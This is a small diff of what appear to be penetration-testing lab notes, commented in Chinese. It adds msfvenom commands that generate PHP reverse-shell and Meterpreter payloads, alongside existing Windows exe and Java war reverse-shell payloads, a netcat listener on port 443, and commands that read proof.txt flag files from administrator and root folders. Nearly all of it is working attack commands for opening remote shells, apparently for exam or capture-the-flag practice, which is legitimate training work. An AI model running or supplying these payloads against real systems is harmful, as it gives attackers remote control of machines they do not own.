@@ -2,6 +2,13 @@
 每次生成....'port'一定要改
 msfvenom -p windows/shell_reverse_tcp LHOST=自己 LPORT=443 -f exe > evil.exe
 msfvenom -p java/shell_reverse_tcp LHOST=自己 LPORT=442 -f war > evil.war
+
+msfvenom -p php/reverse_php LHOST=自己 LPORT=443 R > evil.txt
+msfvenom -p php/reverse_php LHOST=自己 LPORT=443 -f raw > evil.php
+msfvenom -p php/meterpreter_reverse_tcp LHOST=自己 LPORT=443 -f raw > evil.php
+
+
+
 nc -lvp 443
 type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
 cat /root/proof.txt
